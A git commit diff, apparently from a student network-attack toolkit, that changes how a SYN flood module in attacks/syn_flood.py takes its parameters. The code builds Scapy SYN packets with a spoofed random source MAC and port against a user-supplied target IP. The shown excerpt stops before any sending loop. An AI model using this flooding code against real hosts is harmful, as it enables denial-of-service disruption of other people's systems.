a5ff669348c4221d9332fb05ccf45df5a9ada67a
sdillibabu-seneca <sdillibabu@myseneca.ca>
2023-03-19 11:37:18 -0400

    Fixed Import Error

--- attacks/syn_flood.py
+++ attacks/syn_flood.py
@@ -1,15 +1,16 @@
 from Project import *
+
 req_port = "any"
 name = "SYN Flood"
 function_name = "syn_flood"
 
-def syn_flood():
+def syn_flood(values):
     print("SYN Flood")
     valid_var = ["source_mac_address", "target_mac_address", "target_ip", "quantity"]
     help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
     print("\nRunning SYN Flood attack, please enter the parameters:\n")
-    variable_input(valid_var, help_statement)
-    all_variables_inputted(valid_var)
+    variable_input(valid_var, help_statement, values)
+    all_variables_inputted(values, valid_var)
     check_var(values, valid_var)
     template = (Ether(src=RandMAC(), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
     ns = []
